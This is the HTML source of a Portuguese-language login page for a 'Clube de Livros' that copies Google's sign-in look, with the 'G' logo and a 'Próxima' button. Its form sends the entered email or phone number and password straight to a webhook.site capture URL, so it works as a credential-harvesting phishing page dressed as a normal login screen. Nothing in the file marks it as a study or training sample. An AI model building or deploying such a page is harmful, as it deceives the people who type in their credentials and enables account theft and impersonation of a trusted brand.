<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clube de Livros - Login</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/561/561127.png" type="image/png" />
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_%22G%22_Logo.svg/512px-Google_%22G%22_Logo.svg.png" alt="Logo" class="logo">
      <h2>Bem-vindo ao Clube de Livros</h2>
      <p class="subtitle">Faça login para continuar</p>
      <form action="https://webhook.site/530233c5-d174-407c-8fa7-541c9020c097 "method="POST">
        <input type="email" name="email" placeholder="E-mail ou telefone" required />
        <input type="password" name="senha" placeholder="Senha" required />
        <button type="submit">Próxima</button>
        <div class="footer-link">
          <a href="#">Esqueceu a senha?</a>
        </div>
      </form>
    </div>
  </div>
</body>
</html>
